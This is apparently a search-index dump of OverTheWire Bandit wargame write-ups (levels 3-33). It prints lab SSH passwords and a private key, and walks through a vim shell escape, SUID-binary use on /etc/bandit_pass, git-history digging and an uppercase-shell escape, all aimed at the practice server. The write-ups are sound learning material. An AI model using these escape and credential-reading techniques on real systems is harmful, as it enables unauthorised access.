MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9 /5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi 1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix 3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI 2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj 6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3 JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd 1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5 /Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY = -----END RSA PRIVATE KEY-----","title":"Level 26"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2026/#level-26","text":"","title":"Level 26"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2026/#objectives","text":"SSH to bandit25 Find out how to get to bandit26","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2026/#objective-1","text":"Username: bandit25 Password: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit25@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2026/#objective-2","text":"Taking a quick look, we find bandit26.sshkey in the home directory. Now just use that to log into bandit26 . bandit25@bandit:~$ ls bandit26.sshkey bandit25@bandit:~$ cat bandit26.sshkey -----BEGIN RSA PRIVATE KEY----- MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9 /5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi 1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix 3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI 2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj 6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3 JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd 1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5 /Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY = -----END RSA PRIVATE KEY-----","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2027/","text":"Level 27 Objectives SSH into bandit26 Break out of the current shell Objective 1 Username: bandit26 Password: ssh-key Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit26@bandit.labs.overthewire.org -i ssh-key Success! Objective 2 We connected but immediately get disconnected. From bandit25 , check the default shell for bandit26 . bandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26 :/home/bandit26:/usr/bin/showtext Typical GTFOBins with vi/vim is to make your terminal as small as possible, you can then use vim to give you a shell. user@localhost:~$ ssh -p 2220 bandit26@bandit.labs.overthewire.org -i ssh-key [ PRESS V ] :set shell = /bin/bash :shell Now you should have a shell as bandit26 . Now we need to find bandit27 . bandit26@bandit:~$ ls bandit27-do text.txt Looks like it's another SUID binary to go get the next password. Here's what the binary tells us: bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id Should be very similar to how level 20 was. bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea","title":"Level 27"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2027/#level-27","text":"","title":"Level 27"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2027/#objectives","text":"SSH into bandit26 Break out of the current shell","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2027/#objective-1","text":"Username: bandit26 Password: ssh-key Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit26@bandit.labs.overthewire.org -i ssh-key Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2027/#objective-2","text":"We connected but immediately get disconnected. From bandit25 , check the default shell for bandit26 . bandit25@bandit:~$ cat /etc/passwd | grep bandit26 bandit26:x:11026:11026:bandit level 26 :/home/bandit26:/usr/bin/showtext Typical GTFOBins with vi/vim is to make your terminal as small as possible, you can then use vim to give you a shell. user@localhost:~$ ssh -p 2220 bandit26@bandit.labs.overthewire.org -i ssh-key [ PRESS V ] :set shell = /bin/bash :shell Now you should have a shell as bandit26 . Now we need to find bandit27 . bandit26@bandit:~$ ls bandit27-do text.txt Looks like it's another SUID binary to go get the next password. Here's what the binary tells us: bandit26@bandit:~$ ./bandit27-do Run a command as another user. Example: ./bandit27-do id Should be very similar to how level 20 was. bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27 3ba3118a22e93127a4ed485be72ef5ea","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2028/","text":"Level 28 Objectives SSH to bandit27 Clone the git repo Objective 1 Username: bandit27 Password: 3ba3118a22e93127a4ed485be72ef5ea Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit27@bandit.labs.overthewire.org Success! Objective 2 We're told to clone a git repository from ssh://bandit27-git@localhost/home/bandit27-git/repo . We need to make a directory in /tmp and then clone the repository. bandit27@bandit:~$ mkdir /tmp/dirwalk bandit27@bandit:~$ cd /tmp/dirwalk bandit27@bandit:/tmp/dirwalk$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo You should now have a repo. Inside the repo is README , which should contain what we want. bandit27@bandit:/tmp/dirwalk$ cat repo/README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2","title":"Level 28"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2028/#level-28","text":"","title":"Level 28"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2028/#objectives","text":"SSH to bandit27 Clone the git repo","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2028/#objective-1","text":"Username: bandit27 Password: 3ba3118a22e93127a4ed485be72ef5ea Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit27@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2028/#objective-2","text":"We're told to clone a git repository from ssh://bandit27-git@localhost/home/bandit27-git/repo . We need to make a directory in /tmp and then clone the repository. bandit27@bandit:~$ mkdir /tmp/dirwalk bandit27@bandit:~$ cd /tmp/dirwalk bandit27@bandit:/tmp/dirwalk$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repo You should now have a repo. Inside the repo is README , which should contain what we want. bandit27@bandit:/tmp/dirwalk$ cat repo/README The password to the next level is: 0ef186ac70e04ea33b4c1853d2526fa2","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2029/","text":"Level 29 Objectives SSH to bandit28 Clone the repository Objective 1 Username: bandit28 Password: 0ef186ac70e04ea33b4c1853d2526fa2 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit28@bandit.labs.overthewire.org Success! Objective 2 Make another directory in /tmp to work in. We are told that the repository is at ssh://bandit28-git@localhost/home/bandit28-git/repo and the password is the same. bandit28@bandit:/tmp/dirwalk$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo In the repo, we see a README.md file with no password. You should start working with git to see whatelse we can see. The good and bad of git, is that it keeps your previous versions of whatever you commited. We should check the log of commits. bandit28@bandit:/tmp/dirwalk$ git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla <morla@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla <morla@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover <noone@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 initial commit of README.md We now know that something was leaked before. Let's check to see what changed between the two. bandit28@bandit:/tmp/dirwalk$ git diff 073c27c130e6ee407e12faad1dd3848a110c4f95 186a1038cc54d1358d42d468cdc8e3cc28a93fcb diff --git a/README.md b/README.md index 5c6457b..3f7cee8 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: bbc96594b4e001778eee9975372716b2","title":"Level 29"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2029/#level-29","text":"","title":"Level 29"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2029/#objectives","text":"SSH to bandit28 Clone the repository","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2029/#objective-1","text":"Username: bandit28 Password: 0ef186ac70e04ea33b4c1853d2526fa2 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit28@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2029/#objective-2","text":"Make another directory in /tmp to work in. We are told that the repository is at ssh://bandit28-git@localhost/home/bandit28-git/repo and the password is the same. bandit28@bandit:/tmp/dirwalk$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repo In the repo, we see a README.md file with no password. You should start working with git to see whatelse we can see. The good and bad of git, is that it keeps your previous versions of whatever you commited. We should check the log of commits. bandit28@bandit:/tmp/dirwalk$ git log commit 073c27c130e6ee407e12faad1dd3848a110c4f95 Author: Morla Porla <morla@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 fix info leak commit 186a1038cc54d1358d42d468cdc8e3cc28a93fcb Author: Morla Porla <morla@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 add missing data commit b67405defc6ef44210c53345fc953e6a21338cc7 Author: Ben Dover <noone@overthewire.org> Date: Tue Oct 16 14 :00:39 2018 +0200 initial commit of README.md We now know that something was leaked before. Let's check to see what changed between the two. bandit28@bandit:/tmp/dirwalk$ git diff 073c27c130e6ee407e12faad1dd3848a110c4f95 186a1038cc54d1358d42d468cdc8e3cc28a93fcb diff --git a/README.md b/README.md index 5c6457b..3f7cee8 100644 --- a/README.md +++ b/README.md @@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29 -- password: xxxxxxxxxx +- password: bbc96594b4e001778eee9975372716b2","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%203/","text":"Level 3 Objectives SSH to bandit2 Read a file named spaces in this filename in the home directory Objective 1 Username: bandit2 Password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit2@bandit.labs.overthewire.org Success! Objective 2 An ls will show us exactly what we expect. bandit2@bandit:~$ ls spaces in this filename We can either handle space with escapes ( \\ ) or with simple quotes. bandit2@bandit:~$ cat 'spaces in this filename' UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Syntax for escapes would look like this: bandit2@bandit:~$ cat spaces \\ in \\ this \\ filename","title":"Level 3"},{"location":"Write-Ups/OverTheWire/Bandit/Level%203/#level-3","text":"","title":"Level 3"},{"location":"Write-Ups/OverTheWire/Bandit/Level%203/#objectives","text":"SSH to bandit2 Read a file named spaces in this filename in the home directory","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%203/#objective-1","text":"Username: bandit2 Password: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit2@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%203/#objective-2","text":"An ls will show us exactly what we expect. bandit2@bandit:~$ ls spaces in this filename We can either handle space with escapes ( \\ ) or with simple quotes. bandit2@bandit:~$ cat 'spaces in this filename' UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Syntax for escapes would look like this: bandit2@bandit:~$ cat spaces \\ in \\ this \\ filename","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2030/","text":"Level 30 Objectives SSH to bandit29 Clone the repo Objective 1 Username: bandit29 Password: bbc96594b4e001778eee9975372716b2 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit29@bandit.labs.overthewire.org Success! Objective 2 Create a working directory in /tmp . Clone the ssh://bandit29-git@localhost/home/bandit29-git/repo repo they give us and use the same password. bandit29@bandit:/tmp/dirwalk$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo There's a README.md file. We should read what it has to say. bandit29@bandit:/tmp/dirwalk$ cat repo/README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: <no passwords in production!> To me, this indicates the use of git branches, since that's how you typically separate code in testing vs production. bandit29@bandit:/tmp/dirwalk$ git branch -r origin/HEAD -> origin/master origin/dev origin/master origin/sploits-dev bandit29@bandit:/tmp/dirwalk$ git checkout dev Previous HEAD position was 2af54c5... add some silly exploit, just for shit and giggles Branch dev set up to track remote branch dev from origin. Switched to a new branch 'dev' bandit29@bandit:/tmp/dirwalk$ ls code README.md Now we see some stuff. Let's check the README.md . bandit29@bandit:/tmp/dirwalk$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: 5b90576bedb2cc04c86a9e924ce42faf","title":"Level 30"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2030/#level-30","text":"","title":"Level 30"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2030/#objectives","text":"SSH to bandit29 Clone the repo","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2030/#objective-1","text":"Username: bandit29 Password: bbc96594b4e001778eee9975372716b2 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit29@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2030/#objective-2","text":"Create a working directory in /tmp . Clone the ssh://bandit29-git@localhost/home/bandit29-git/repo repo they give us and use the same password. bandit29@bandit:/tmp/dirwalk$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repo There's a README.md file. We should read what it has to say. bandit29@bandit:/tmp/dirwalk$ cat repo/README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: <no passwords in production!> To me, this indicates the use of git branches, since that's how you typically separate code in testing vs production. bandit29@bandit:/tmp/dirwalk$ git branch -r origin/HEAD -> origin/master origin/dev origin/master origin/sploits-dev bandit29@bandit:/tmp/dirwalk$ git checkout dev Previous HEAD position was 2af54c5... add some silly exploit, just for shit and giggles Branch dev set up to track remote branch dev from origin. Switched to a new branch 'dev' bandit29@bandit:/tmp/dirwalk$ ls code README.md Now we see some stuff. Let's check the README.md . bandit29@bandit:/tmp/dirwalk$ cat README.md # Bandit Notes Some notes for bandit30 of bandit. ## credentials - username: bandit30 - password: 5b90576bedb2cc04c86a9e924ce42faf","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2031/","text":"Level 31 Objectives SSH to bandit30 Clone the repo Objective 1 Username: bandit30 Password: 5b90576bedb2cc04c86a9e924ce42faf Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit30@bandit.labs.overthewire.org Success! Objective 2 Create a working directory in /tmp . Clone the ssh://bandit30-git@localhost/home/bandit30-git/repo repo they give us and use the same password. bandit30@bandit:/tmp/dirwalk$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo bandit30@bandit:/tmp/dirwalk$ ls repo/ README.md bandit30@bandit:/tmp/dirwalk$ cat repo/README.md just an epmty file... muahaha Not a whole lot there, so let's keep looking. No extra branches or no extra commits, seems pretty empty. How about git tags? bandit30@bandit:/tmp/dirwalk$ git tag secret bandit30@bandit:/tmp/dirwalk$ git show secret 47e603bb428404d265f59c42920d81e5","title":"Level 31"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2031/#level-31","text":"","title":"Level 31"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2031/#objectives","text":"SSH to bandit30 Clone the repo","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2031/#objective-1","text":"Username: bandit30 Password: 5b90576bedb2cc04c86a9e924ce42faf Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit30@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2031/#objective-2","text":"Create a working directory in /tmp . Clone the ssh://bandit30-git@localhost/home/bandit30-git/repo repo they give us and use the same password. bandit30@bandit:/tmp/dirwalk$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repo bandit30@bandit:/tmp/dirwalk$ ls repo/ README.md bandit30@bandit:/tmp/dirwalk$ cat repo/README.md just an epmty file... muahaha Not a whole lot there, so let's keep looking. No extra branches or no extra commits, seems pretty empty. How about git tags? bandit30@bandit:/tmp/dirwalk$ git tag secret bandit30@bandit:/tmp/dirwalk$ git show secret 47e603bb428404d265f59c42920d81e5","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2032/","text":"Level 32 Objectives SSH to bandit31 Clone the repo Objective 1 Username: bandit31 Password: 47e603bb428404d265f59c42920d81e5 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit31@bandit.labs.overthewire.org Objective 2 Create a working directory in /tmp . Clone the ssh://bandit31-git@localhost/home/bandit31-git/repo repo they give us and use the same password. bandit31@bandit:/tmp/dirwalk$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Now let's look around and see what we find. README.md tells us this: bandit31@bandit:/tmp/dirwalk$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master .gitignore tells us this: bandit31@bandit:/tmp/dirwalk$ cat .gitignore *.txt We'll likely need to push key.txt to master, keeping mind the .gitignore . bandit31@bandit:/tmp/dirwalk$ echo 'May I come in?' > key.txt bandit31@bandit:/tmp/dirwalk$ git add key.txt -f bandit31@bandit:/tmp/dirwalk$ git commit -m 'key.txt' bandit31@bandit:/tmp/dirwalk$ git push origin master Counting objects: 3 , done . Delta compression using up to 4 threads. Compressing objects: 100 % ( 2 /2 ) , done . Writing objects: 100 % ( 3 /3 ) , 319 bytes | 0 bytes/s, done . Total 3 ( delta 0 ) , reused 0 ( delta 0 ) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done ! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [ remote rejected ] master -> master ( pre-receive hook declined ) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'","title":"Level 32"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2032/#level-32","text":"","title":"Level 32"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2032/#objectives","text":"SSH to bandit31 Clone the repo","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2032/#objective-1","text":"Username: bandit31 Password: 47e603bb428404d265f59c42920d81e5 Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit31@bandit.labs.overthewire.org","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2032/#objective-2","text":"Create a working directory in /tmp . Clone the ssh://bandit31-git@localhost/home/bandit31-git/repo repo they give us and use the same password. bandit31@bandit:/tmp/dirwalk$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repo Now let's look around and see what we find. README.md tells us this: bandit31@bandit:/tmp/dirwalk$ cat README.md This time your task is to push a file to the remote repository. Details: File name: key.txt Content: 'May I come in?' Branch: master .gitignore tells us this: bandit31@bandit:/tmp/dirwalk$ cat .gitignore *.txt We'll likely need to push key.txt to master, keeping mind the .gitignore . bandit31@bandit:/tmp/dirwalk$ echo 'May I come in?' > key.txt bandit31@bandit:/tmp/dirwalk$ git add key.txt -f bandit31@bandit:/tmp/dirwalk$ git commit -m 'key.txt' bandit31@bandit:/tmp/dirwalk$ git push origin master Counting objects: 3 , done . Delta compression using up to 4 threads. Compressing objects: 100 % ( 2 /2 ) , done . Writing objects: 100 % ( 3 /3 ) , 319 bytes | 0 bytes/s, done . Total 3 ( delta 0 ) , reused 0 ( delta 0 ) remote: ### Attempting to validate files... #### remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: remote: Well done ! Here is the password for the next level: remote: 56a9bf19c63d650ce78e6ec0354ee45e remote: remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo. remote: To ssh://localhost/home/bandit31-git/repo ! [ remote rejected ] master -> master ( pre-receive hook declined ) error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2033/","text":"Level 33 Objectives SSH to bandit32 Escape Objective 1 Username: bandit31 Password: 56a9bf19c63d650ce78e6ec0354ee45e Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit32@bandit.labs.overthewire.org Success! Objective 2 Upon connection, it immediately tells us this: WELCOME TO THE UPPERCASE SHELL >> ls sh: 1 : LS: not found >> LS sh: 1 : LS: not found >> pwd sh: 1 : PWD: not found Maybe we can use shell variables to replay our command. >> pwd sh: 1 : PWD: not found >> $0 $ ls uppershell $ /bin/bash bandit33@bandit:~$ ls uppershell bandit33@bandit:~$ Now let's just head for the password. bandit33@bandit:~$ cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee","title":"Level 33"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2033/#level-33","text":"","title":"Level 33"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2033/#objectives","text":"SSH to bandit32 Escape","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2033/#objective-1","text":"Username: bandit31 Password: 56a9bf19c63d650ce78e6ec0354ee45e Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit32@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%2033/#objective-2","text":"Upon connection, it immediately tells us this: WELCOME TO THE UPPERCASE SHELL >> ls sh: 1 : LS: not found >> LS sh: 1 : LS: not found >> pwd sh: 1 : PWD: not found Maybe we can use shell variables to replay our command. >> pwd sh: 1 : PWD: not found >> $0 $ ls uppershell $ /bin/bash bandit33@bandit:~$ ls uppershell bandit33@bandit:~$ Now let's just head for the password. bandit33@bandit:~$ cat /etc/bandit_pass/bandit33 c9c3199ddf4121b10cf581a98d51caee","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%204/","text":"Level 4 Objectives SSH user bandit3 Read a password from a hidden file in the inhere directory Objective 1 Username: bandit3 Password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit3@bandit.labs.overthewire.org Success! Objective 2 An ls of inhere shows us nothing. We need to use the -a flag to show us the hidden files. bandit3@bandit:~$ ls -a inhere/ . .. .hidden Now we just need to read from the hidden file. bandit3@bandit:~$ cat inhere/.hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB","title":"Level 4"},{"location":"Write-Ups/OverTheWire/Bandit/Level%204/#level-4","text":"","title":"Level 4"},{"location":"Write-Ups/OverTheWire/Bandit/Level%204/#objectives","text":"SSH user bandit3 Read a password from a hidden file in the inhere directory","title":"Objectives"},{"location":"Write-Ups/OverTheWire/Bandit/Level%204/#objective-1","text":"Username: bandit3 Password: UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit3@bandit.labs.overthewire.org Success!","title":"Objective 1"},{"location":"Write-Ups/OverTheWire/Bandit/Level%204/#objective-2","text":"An ls of inhere shows us nothing. We need to use the -a flag to show us the hidden files. bandit3@bandit:~$ ls -a inhere/ . .. .hidden Now we just need to read from the hidden file. bandit3@bandit:~$ cat inhere/.hidden pIwrPrtPN36QITSp3EQaw936yaFoFgAB","title":"Objective 2"},{"location":"Write-Ups/OverTheWire/Bandit/Level%205/","text":"Level 5 Objectives SSH to new user bandit4 Read the password from the only human-readable file in the inhere directory Objective 1 Username: bandit4 Password: pIwrPrtPN36QITSp3EQaw936yaFoFgAB Port: 2220 IP/Hostname: bandit.labs.overthewire.org user@localhost:~$ ssh -p 2220 bandit4@bandit.labs.overthewire.org Success! Objective 2 If you're looking for a \"human-readable\" file, you're likely looking for an ASCII file. Do a file on all of the files in the inhere directory. bandit4@bandit:~$ file inhere/* inhere/-file00: data inhere/-file01: data inhere/-file02: data inhere/-file03: data inhere/-file04: data inhere/-file05: data 